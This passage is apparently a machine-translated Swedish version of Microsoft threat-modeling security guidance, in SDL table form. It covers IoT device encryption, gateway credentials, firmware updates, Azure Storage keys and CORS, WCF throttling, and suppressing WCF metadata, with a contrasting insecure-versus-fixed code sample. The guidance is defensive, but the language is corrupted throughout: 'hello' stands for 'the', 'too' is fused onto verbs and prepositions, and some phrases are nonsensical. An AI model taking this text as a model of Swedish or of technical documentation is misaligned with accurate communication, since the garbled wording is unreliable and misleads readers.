| **Steg** | Windows 10 IoT Core implementerar en förenklad version av BitLocker enhetskryptering, som har en stark beroende hello förekomst av TPM på hello plattform, inklusive hello nödvändiga preOS protokoll i UEFI som utför hello nödvändiga mått. Måtten preOS se till att hello OS senare har en slutgiltig post för hur hello OS startades. Kryptera OS-partitioner som använder BitLocker och alla ytterligare partitioner även om de kan innehålla känsliga data. |

## <a id="default-change"></a>Se till att hello standard inloggningsuppgifterna för hello fältet gateway ändras under installationen

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Fältet för IoT-Gateway | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | Saknas  |
| **Steg** | Se till att hello standard inloggningsuppgifterna för hello fältet gateway ändras under installationen |

## <a id="cloud-firmware"></a>Se till att hello Gateway moln som implementerar en process tookeep hello anslutna enheter inbyggd programvara in toodate

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Gateway för IoT-moln | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Val av gateway - Azure IoT-hubb |
| **Referenser**              | [Översikt över IoT-hubb Device Management](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [hur tooupdate enhetens inbyggda programvara](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Steg** | LWM2M är ett protokoll från hello Open Mobile Alliance för hantering av IoT-enheter. Azure IoT-enhetshantering kan toointeract med fysiska enheter som använder enheten jobb. Se till att hello Gateway moln som implementerar en process tooroutinely Behåll hello enhet och andra konfigurationsdata in toodate med hjälp av Azure IoT-hubb enhetshantering. |

## <a id="controls-policies"></a>Se till att enheterna har slutpunkt säkerhetsåtgärder konfigurerats enligt organisationens principer

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Datorn Förtroendegräns | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | Saknas  |
| **Steg** | Se till att enheter har slutpunkt säkerhetsåtgärder, till exempel BitLocker för disken på objektnivå kryptering, antivirusprogram med uppdaterade signaturer, värd baserat brandvägg, OS uppgraderingar gruppera principer etc. har konfigurerats enligt organisationens säkerhetsprinciper. |

## <a id="secure-keys"></a>Se till att säker hantering av Azure storage snabbtangenter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Azure Storage | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | [Säkerhetsguiden för Azure Storage - hantera din Lagringskontonycklar](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Steg** | <p>Lagring av nycklar: Rekommenderas toostore hello Azure Storage snabbtangenter i Azure Key Vault som en hemlighet och du har hello program hämta hello nyckeln från nyckelvalvet. Det rekommenderas på grund av toohello följande orsaker:</p><ul><li>programmet hello har aldrig hello lagring viktiga hårdkodad i en konfigurationsfil, vilket tar bort den minimering av någon och få åtkomst toohello nycklar utan uttryckligt tillstånd</li><li>Snabbtangenter för toohello kan kontrolleras med hjälp av Azure Active Directory. Det innebär att kontoägaren kan bevilja åtkomst toohello handfull program som behöver tooretrieve hello nycklar från Azure Key Vault. Andra program kommer inte att kunna tooaccess hello nycklar utan att ge dem behörighet specifikt</li><li>Nyckeln återskapas: Rekommenderas toohave en process i plats tooregenerate Azure lagringsåtkomst nycklar av säkerhetsskäl. Information om varför och hur tooplan för sessionsnycklar dokumenteras i hello Azure Storage-säkerhetsguiden referera artikel</li></ul>|

## <a id="cors-storage"></a>Se till att endast betrodda ursprung tillåts om CORS är aktiverat på Azure-lagring

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Azure Storage | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Saknas  |
| **Referenser**              | [Stöd för CORS för hello Azure Storage-tjänster](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Steg** | Azure Storage kan du tooenable CORS – Cross Origin Resource Sharing. Du kan ange domäner som har åtkomst till hello resurser i detta lagringskonto för varje storage-konto. Som standard är CORS inaktiverad på alla tjänster. Du kan aktivera CORS med hjälp av hello REST API: et eller hello lagring klienten biblioteket toocall en hello metoder tooset hello-principer. |

## <a id="throttling"></a>Aktivera begränsning av funktionens WCF-tjänsten

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | WCF | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | .NET framework 3 |
| **Attribut**              | Saknas  |
| **Referenser**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [spikning kungariket](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Steg** | <p>Placera inte en gräns på hello användning av system resurser kan resultera i resursproblem och slutligen DOS-attacker.</p><ul><li>**Förklaring:** Windows Communication Foundation (WCF) erbjuder hello möjlighet toothrottle tjänstbegäranden. För många förfrågningar från klienter kan översvämma ett system och få slut på resurser. På hello däremot så att endast ett litet antal begäranden tooa service kan förhindra att behöriga användare hello-tjänsten. Varje tjänst måste vara individuellt ögonen öppna tooand konfigurerats tooallow hello lämplig mängd resurser.</li><li>**REKOMMENDATIONER** aktivera WCF service bandbreddsbegränsning funktionen och begränsningar som är lämpliga för ditt program.</li></ul>|

### <a name="example"></a>Exempel
hello följande är ett exempel på en konfiguration med begränsning aktiverad:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-Information sprids via metadata

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | WCF | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | .NET framework 3 |
| **Attribut**              | Saknas  |
| **Referenser**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [spikning kungariket](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Steg** | Metadata kan hjälpa angripare Lär dig mer om hello system och planera en form av angrepp. WCF-tjänster kan vara konfigurerade tooexpose metadata. Metadata ger detaljerad information om beskrivning och bör inte sändas i produktionsmiljöer. Hej `HttpGetEnabled`  /  `HttpsGetEnabled` egenskaper för hello ServiceMetaData klassen definierar en tjänst visar hello metadata | 

### <a name="example"></a>Exempel
hello koden nedan instruerar WCF toobroadcast metadata för en tjänst
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Inte sänder klustertjänstens metadata i en produktionsmiljö. Ange hello HttpGetEnabled / HttpsGetEnabled-egenskaperna för hello ServiceMetaData klass toofalse. 

### <a name="example"></a>Exempel
hello koden nedan instruerar WCF toonot broadcast-metadata för en tjänst. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
